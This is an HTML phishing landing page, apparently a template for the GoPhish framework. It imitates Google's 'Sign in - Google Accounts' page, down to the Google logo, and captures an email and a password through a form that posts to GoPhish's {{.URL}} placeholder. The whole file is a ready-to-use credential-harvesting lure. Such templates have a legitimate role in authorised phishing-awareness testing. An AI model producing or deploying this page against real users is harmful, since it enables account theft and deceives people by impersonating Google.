<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
</head>
<body style="background-color: #f2f2f2; font-family: Arial, sans-serif;">

<!-- REQUIRED to work with GoPhish -->
<form method="POST" action="{{.URL}}" id="loginForm">
    <div style="width: 360px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align:center;">
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" width="80" style="margin-bottom: 20px;" alt="Google Logo" />
        
        <input name="email" placeholder="Email or phone" required
            style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;" type="text" />
        
        <input name="password" placeholder="Enter your password" required
            style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;" type="password" />
        
        <button type="submit"
            style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;">
            Next
        </button>
    </div>
</form>

</body>
</html>
